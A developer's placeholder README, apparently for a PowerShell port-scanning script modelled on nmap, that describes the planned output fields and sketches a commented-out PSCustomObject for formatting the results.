# Placeholder README to explain the variables (this file can be removed later!!!)

# Output object should include:
    # hostIP = the resolved IP (resolved at beginning of execution loop)
    # hostName = the hostName (this is specifically used in the sanity check sL which- 
    # - just lists hostIPs/with hostname and does not ping or anything)

    # hostStatus = the "up/down" status found in host discovery (if used, otherwise left blank)
    # latency = the time for the ping in host discovery (if used, otherwise left blank)
    
    # port = the port # specified + "/tcp" in the output (to match nmap formatting)
    # portStatus = open/closed/filtered, updated via port scanning (if used, otherwise left blank)
    # service = the port service (found in port scanning if used, otherwise left blank)

# At the end of the executable loop (immediately following the scripts inserted -
# - but not before end of host loop), create a PSObject containing all of these! then format table
# - to include only the ones needed (exclude empty values/go off of flags)

# $output = [PSCustomObject]@{
#     HOST = $hostIP
#     HOSTNAME = $hostName

#     HOSTSTATUS = $hostStatus # the name of this column will never be used (Host ---- is "up/down" is the message)
#     LATENCY = $latency

#     PORT = $port
#     STATUS = $portStatus
#     SERVICE = $service
# }
